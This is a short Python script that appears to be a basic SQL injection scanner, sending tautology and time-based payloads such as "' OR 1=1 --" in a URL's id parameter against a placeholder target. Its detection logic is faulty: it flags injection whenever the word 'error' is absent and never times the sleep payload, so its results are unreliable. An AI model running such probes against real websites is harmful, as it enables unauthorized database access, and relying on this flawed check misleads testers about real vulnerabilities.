import requests

def test_sql_injection(url):

    payloads = ["' OR 1=1 --", "' OR 'a'='a'", "' OR sleep(5) --"]
    for payload in payloads:
        target = f"{url}?id={payload}"
        try:
            response = requests.get(target)
            if "error" not in response.text.lower():
                print(f"[+] sqlinjection is possible (payload: {payload})")
        except Exception as e:
            print(f"[-] error: {e}")

# 테스트
test_url = "test_url"
test_sql_injection(test_url)
